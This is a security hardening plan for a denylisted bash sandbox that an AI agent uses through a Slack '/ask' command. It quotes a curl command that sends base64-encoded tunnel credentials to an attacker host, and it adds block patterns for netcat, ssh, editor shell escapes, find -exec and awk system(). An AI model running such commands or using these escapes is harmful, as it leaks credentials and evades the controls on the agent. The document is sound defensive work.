# Plan — harden the `/ask` bash sandbox (`bin/k3dm-ask-bash`) — audit F2

**Date:** 2026-09-07
**Source:** webhook-server security audit `docs/issues/2026-09-07-webhook-server-security-audit.md`, finding **F2 (HIGH)**.
**Branch (single repo, k3d-manager):** `k3d-manager-v1.32.0`
**Target files:** `bin/k3dm-ask-bash`, `bin/k3dm-webhook` (one prompt line), `scripts/tests/lib/webhook.bats`
**Must land BEFORE** the Hermes↔Slack approval feature widens the Slack audience that can reach `ask`.

---

## Background

`bin/k3dm-ask-bash` is a **denylist in front of `exec /bin/bash "$@"`**, reachable by a `reader`-tier
Slack user through `/ask`. The audit found a concrete, **no-bypass** exfiltration path: `_DIAG_PATHS`
lets the agent read `~/.kube` (kubeconfig + tokens) and `~/.cloudflared` (tunnel credentials), while a
plain `curl` GET is allowed — so `curl "https://attacker/?d=$(cat ~/.cloudflared/*.json | base64)"`
exfiltrates credentials using only allowlisted verbs. Additional denylist gaps: `find … -exec`, BSD
`awk 'BEGIN{system(...)}'`, editors with shell-escape (`vi`/`less`/`man`), and **`make` is unrestricted
in read-only mode** (only the fix-mode branch restricts it to `fix-*`).

**This spec = Phase 1: eliminate the exfil path and close the concrete exec vectors.** It does NOT
convert the sandbox to an allowlist — that is the durable fix (Phase 2, below) and is a larger design
task. Phase 1 is a landable, high-confidence reduction of F2.

## Changes

### Change 1 — drop credential/system dirs from `_DIAG_PATHS`

`bin/k3dm-ask-bash` — the agent never needs to read the kubeconfig or tunnel creds directly (`kubectl`
reads the kubeconfig internally; a bare `kubectl get pods` has no path argument), so these dirs only
serve as exfil targets.

**OLD:**
```bash
_DIAG_PATHS=(
  /etc
  /Library/LaunchDaemons
  /Library/LaunchAgents
  "${HOME}/.kube"
  "${HOME}/.local/share/k3d-manager"
  "${HOME}/.cloudflared"
  /var/log
  /usr/local/bin
  /usr/bin
  /bin
  /opt/homebrew
)
```

**NEW:**
```bash
_DIAG_PATHS=(
  "${HOME}/.local/share/k3d-manager"
  /var/log
  /usr/local/bin
  /usr/bin
  /bin
  /opt/homebrew
)
```

### Change 2 — block outbound network egress outright

`bin/k3dm-ask-bash` — replace the write-verb-only curl/wget rule. The sandbox has no need to reach the
network to troubleshoot the cluster (kubectl talks to the API server directly), and blocking egress
outright removes the destination for any readable-file exfil.

**OLD:**
```bash
# curl/wget write operations
if echo "$CMD" | grep -qE '\b(curl|wget)\b.*(-X\s*(POST|PUT|DELETE|PATCH)|--request\s*(POST|PUT|DELETE|PATCH)|--data|--upload-file)'; then
  _deny "$CMD"
fi
```

**NEW:**
```bash
# Outbound network clients — the sandbox does not need general egress to troubleshoot
# (kubectl talks to the API server directly). Block them outright so a readable-file
# exfil (curl "https://x/?d=$(...)") has nowhere to send the data.
if echo "$CMD" | grep -qE '\b(curl|wget|nc|ncat|netcat|telnet|socat|ftp|scp|sftp|rsync|ssh)\b'; then
  _deny "$CMD"
fi
```

### Change 3 — close editor / find-exec / tar-exec / awk-system shell-escape vectors

`bin/k3dm-ask-bash` — add these rules to the "Always blocked (both modes)" section, immediately AFTER
the existing "General-purpose interpreters" block (the `python[0-9.]*|perl|ruby|…` rule).

**INSERT (new block):**
```bash
# Editors / pagers with a shell-escape (:!cmd, !cmd) — bypass the denylist above.
if echo "$CMD" | grep -qE '\b(vi|vim|view|ex|nano|emacs|pico|ed|less|more|man)\b'; then
  _deny "$CMD"
fi

# find primitives that execute or mutate; the plain read forms stay allowed.
if echo "$CMD" | grep -qE '\bfind\b.*-(exec(dir)?|delete|fprintf?|fls)\b'; then
  _deny "$CMD"
fi

# archive tools that can spawn a command per entry.
if echo "$CMD" | grep -qE '\btar\b.*(--to-command|--checkpoint-action)|\bcpio\b'; then
  _deny "$CMD"
fi

# BSD awk (macOS /usr/bin/awk) can spawn a shell via system()/pipe; block the exec forms
# while leaving stream use (awk on stdin) allowed.
if echo "$CMD" | grep -qE '\bawk\b.*(system\s*\(|\|\s*"|"\s*\|)'; then
  _deny "$CMD"
fi
```

### Change 4 — block `make` in read-only mode

`bin/k3dm-ask-bash` — the read-only (`else`) branch does not restrict `make`, so any `make <target>`
runs an arbitrary recipe shell. No read-only make target is needed for diagnosis. Add to the read-only
branch (the `else` block that starts with the "Read-only mode (default)" comment), AFTER the helm rule.

**INSERT (new block, inside the `else` read-only branch):**
```bash
  # make: no read-only make target is needed for diagnosis; recipes run arbitrary shell.
  if echo "$CMD" | grep -qE '\bmake\b'; then
    _deny "$CMD"
  fi
```

### Change 5 — keep the agent prompt consistent (no more "curl GET" advice)

`bin/k3dm-webhook` — the `claude_system` prompt advertises `curl (GET only …)` as an allowed tool.
Now that egress is blocked, remove that advice so the agent does not waste turns hitting `❌ Blocked`.

**OLD:**
```
        "  curl (GET only — no -X POST/PUT/DELETE/PATCH), dig, nslookup, ping, ss, netstat\n"
```

**NEW:**
```
        "  dig, nslookup, ping, ss, netstat\n"
```

Leave the `BLOCKED` list and the `codex_system` prompt unchanged (they remain accurate).

## Tests (add to `scripts/tests/lib/webhook.bats`, "Webhook hardening regressions" section)

Follow the existing `@test "k3dm-ask-bash …"` style (`run "${repo_root}/bin/k3dm-ask-bash" -c "…"`,
assert `status -eq 1` and `output == *"Blocked"*` for denials, `status -eq 0` for allows). Add:

- **denies outbound network clients** — `curl https://example.com`, `wget http://x`, `nc x 80`,
  `ssh host`, `scp a b` → each blocked.
- **denies credential-dir reads** — `cat "${HOME}/.cloudflared/anything"` and `cat "${HOME}/.kube/config"`
  → blocked with "Out of scope" (they are no longer in `_DIAG_PATHS`). NOTE: assert on the scope-denial
  message (`*"Out of scope"*` or `*"scope"*`), not `*"Blocked"*`.
- **denies editors and find -exec** — `vi /tmp/x`, `less /var/log/x`, `find . -exec rm {} \;` → blocked.
- **denies awk system()** — `awk 'BEGIN{system("id")}'` → blocked.
- **denies make in read-only mode** — `make up` (no `K3DM_FIX_MODE`) → blocked.
- **still allows plain diagnosis** — `kubectl get pods -n cicd` → status 0 (regression guard; keep the
  existing allow test passing).

Run the whole suite: `bats scripts/tests/lib/webhook.bats` — all tests must pass.

## Phase 2 (durable fix — NOT in this task, documented for the follow-up)

The recurring weakness is **denylist-in-front-of-a-general-shell** (F5). The durable remediation:

1. **Allowlist of vetted read-only operations** — stop `exec /bin/bash "$@"`; accept only a fixed set
   of read-only subcommands (`kubectl get/describe/logs/top/events`, `git log/diff/show/status`, `jq`,
   stream tools on stdin) and reject everything else. This needs a structured invocation protocol so
   there is no shell pipeline to parse.
2. **OS-enforced boundary** — run the `ask` agent as a lower-privilege user or in a container, so the
   filesystem/network boundary is enforced by the OS rather than a bash wrapper.

Phase 2 should precede exposing `ask`/repairs to a broad Slack audience.
